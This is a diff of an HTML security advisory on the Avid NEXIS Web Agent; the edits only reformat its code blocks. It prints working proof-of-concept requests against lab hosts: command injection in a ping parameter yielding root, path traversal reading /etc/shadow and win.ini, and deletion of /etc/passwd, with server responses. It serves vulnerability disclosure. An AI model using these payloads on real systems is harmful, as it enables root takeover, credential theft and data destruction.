@@ -146,8 +146,7 @@ The Avid NEXIS Web Agent allows an authenticated user to execute system function
 
 <p>The vulnerability can be triggered with the following GET request:</p>
 
-<pre><code class="language-http">
-GET /agent?r=tools&amp;type=ping&amp;host=127.0.0.1;id HTTP/1.1
+<pre><code class="language-http">GET /agent?r=tools&amp;type=ping&amp;host=127.0.0.1;id HTTP/1.1
 Host: 192.168.40.141:5015
 Cookie: avidagent=12345; userveragenttoken=3543434935133395140
 Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
@@ -156,44 +155,43 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Sec-Ch-Ua-Platform: "Linux"
 Accept: */*
 Sec-Fetch-Site: same-origin
- Sec-Fetch-Mode: no-cors
- Sec-Fetch-Dest: script
- Referer: https://192.168.40.141:5015/agent
- Accept-Encoding: gzip, deflate, br
- Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
- Priority: u=1
- Connection: close
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://192.168.40.141:5015/agent
+Accept-Encoding: gzip, deflate, br
+Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=1
+Connection: close
 </code></pre>
 
 <p>The response looks like this (stripped):</p>
 
-<pre><code class="language-html">
-    HTTP/1.1 200 OK
-    Server: gSOAP/2.8
-    Content-Type: text/html; charset=utf-8
-    Content-Length: 3581
-    Connection: close
-    &lt;html&gt;
-    &lt;head&gt;
-    &lt;title&gt;192.168.40.141 - Avid NEXIS&reg; Agent 22.12.0.174&lt;/title&gt;
-    ...
+<pre><code class="language-html">HTTP/1.1 200 OK
+Server: gSOAP/2.8
+Content-Type: text/html; charset=utf-8
+Content-Length: 3581
+Connection: close
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;192.168.40.141 - Avid NEXIS&reg; Agent 22.12.0.174&lt;/title&gt;
+...
     
-    &lt;b class='rtop'&gt;&lt;b class='r1'&gt;&lt;/b&gt;&lt;b class='r2'&gt;&lt;/b&gt;&lt;b class='r3'&gt;&lt;/b&gt;&lt;b class='r4'&gt;&lt;/b&gt;&lt;/b&gt;&lt;div id=&quot;content&quot;&gt;12 &lt;div style='display:none;' id='glassPane'&gt;&lt;span class='aligner'&gt;&lt;/span&gt;&lt;h4 class='align' id='glassPaneMessage'&gt;&lt;/h4&gt;&lt;/div&gt;&lt;h2 class=&quot;table-title&quot;&gt;
-    Ping Results
-    &lt;/h3&gt;&lt;/p&gt;
+&lt;b class='rtop'&gt;&lt;b class='r1'&gt;&lt;/b&gt;&lt;b class='r2'&gt;&lt;/b&gt;&lt;b class='r3'&gt;&lt;/b&gt;&lt;b class='r4'&gt;&lt;/b&gt;&lt;/b&gt;&lt;div id=&quot;content&quot;&gt;12 &lt;div style='display:none;' id='glassPane'&gt;&lt;span class='aligner'&gt;&lt;/span&gt;&lt;h4 class='align' id='glassPaneMessage'&gt;&lt;/h4&gt;&lt;/div&gt;&lt;h2 class=&quot;table-title&quot;&gt;
+Ping Results
+&lt;/h3&gt;&lt;/p&gt;
+   
+&lt;div class=&quot;plain&quot;&gt;
+&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.045 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2029ms
+rtt min/avg/max/mdev = 0.040/0.050/0.067/0.014 ms
+uid=0(root) gid=0(root) groups=0(root)context=system_u:system_r:unconfined_service_t:s0
+&lt;/pre&gt;&lt;/div&gt;
     
-    &lt;div class=&quot;plain&quot;&gt;
-    &lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
-    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.045 ms
-    64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
-    --- 127.0.0.1 ping statistics ---
-    3 packets transmitted, 3 received, 0% packet loss, time 2029ms
-    rtt min/avg/max/mdev = 0.040/0.050/0.067/0.014 ms
-    uid=0(root) gid=0(root) groups=0(root)context=system_u:system_r:unconfined_service_t:s0
-    &lt;/pre&gt;&lt;/div&gt;
-    
-    &lt;p&gt;&lt;/div&gt;
+&lt;p&gt;&lt;/div&gt;
 ...
 </code></pre>
 
@@ -225,8 +223,7 @@ attackers are able to obtain critical files like /etc/shadow.</p>
 
 <p>The vulnerability can be triggered with the following GET request:</p>
 
-<pre><code class="language-http">
-GET /logs?filename=%2Fetc%2fshadow HTTP/1.1
+<pre><code class="language-http">GET /logs?filename=%2Fetc%2fshadow HTTP/1.1
 Host: 192.168.40.141:5015
 Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
 Sec-Ch-Ua-Mobile: ?0
@@ -247,8 +244,7 @@ Connection: close
 
 <p>The response looks like this (shortened):</p>
 
-<pre><code class="language-html">
-HTTP/1.1 200 OK
+<pre><code class="language-html">HTTP/1.1 200 OK
 Server: gSOAP/2.8
 Content-Type: application/octet-stream
 Content-Length: 1164
@@ -284,8 +280,7 @@ like /etc/shadow.</p>
 
 <p>The vulnerability can be triggered with the following GET request (shortened):</p>
 
-<pre><code class="language-http">
-GET /agent?filename=%2Fetc%2Fpasswd&amp;r=logs&amp;request=del_usrv_log HTTP/1.1
+<pre><code class="language-http">GET /agent?filename=%2Fetc%2Fpasswd&amp;r=logs&amp;request=del_usrv_log HTTP/1.1
 Host: 192.168.40.141:5015
 Cookie: avidagent=12345; userveragenttoken=1294797077750987387
 Upgrade-Insecure-Requests: 1
@@ -321,28 +316,26 @@ version of the Avid Nexis Agent was not up-to-date.</p>
 
 <p>The vulnerability can be triggered with the following GET request (shortened):</p>
 
-<pre><code class="language-http">
-GET /../../../../../../../../../../../../../../../../windows/win.ini%00/common/lib/jquery/jquery-1.11.3.min.js HTTP/1.1
+<pre><code class="language-http">GET /../../../../../../../../../../../../../../../../windows/win.ini%00/common/lib/jquery/jquery-1.11.3.min.js HTTP/1.1
 Host: 192.168.40.129:5015
 ...
 </code></pre>
 As we can see the response shows the files contents:</p>
 
-<pre><code class="language-html">
-    HTTP/1.1 200 OK
-    Server: gSOAP/2.8
-    Content-Type: application/x-javascript
-    Content-Length: 92
-    Connection: close
-    Expires: Tue, 16 Jul 2024 11:56:11 GMT&lt;/p&gt;
-    
-    &lt;p&gt;; for 16-bit app support
-    [fonts]
-    [extensions]
-    [mci extensions]
-    [files]
-    [Mail]
-    MAPI=1
+<pre><code class="language-html">HTTP/1.1 200 OK
+Server: gSOAP/2.8
+Content-Type: application/x-javascript
+Content-Length: 92
+Connection: close
+Expires: Tue, 16 Jul 2024 11:56:11 GMT&lt;/p&gt;
+
+&lt;p&gt;; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
 </code></pre>
 
 <p>This can also be reproduced on Linux systems.</p>
